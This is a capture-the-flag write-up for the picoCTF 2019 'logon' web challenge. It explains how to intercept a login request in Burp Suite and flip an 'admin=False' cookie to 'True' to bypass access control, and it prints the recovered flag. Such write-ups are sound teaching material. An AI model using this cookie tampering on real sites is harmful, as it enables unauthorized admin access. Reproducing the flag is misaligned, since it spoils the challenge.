# logon
Description: The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at?

Category: Web Exploitation, 100 points.

Original Event: picoCTF 2019

## Solution
The problem provides us with a link which when visited, displays a typical login page with a field for a username and password. The description of the problem hints at the username 'Joe". Let's try that first.
Inputting 'Joe' into the username field and leaving the password empty yields a page with a large red box showing the words: "I'm sorry Joe's password is super secure. You're not getting in that way". 
However, it seems like the site only scans the password of Joe, as you can login without a password by using any other username. Doing this yields a page with a green box stating "Success: You logged in! Not sure you'll be able to see the flag though.", and a gray box stating "No flag for you".

Using BurpSuite's HTTP History, we can see the login request: 
```http
GET /problem/15796/flag HTTP/1.1
Host: jupiter.challenges.picoctf.org
Cookie: password=; username=ratticus; admin=False
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://jupiter.challenges.picoctf.org/problem/15796/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
The username and password cookies are predictable, but there is a third cookie, "admin=False". We can send this login request over to BurpSuite's Repeater to edit and re-forward it.

Changing line 3 of the request to:
```http
Cookie: password=; username=ratticus; admin=True
```
and forwarding the request gives us a new page, now with the green box removed and the gray box proudly displaying the flag.

### Flag: picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}
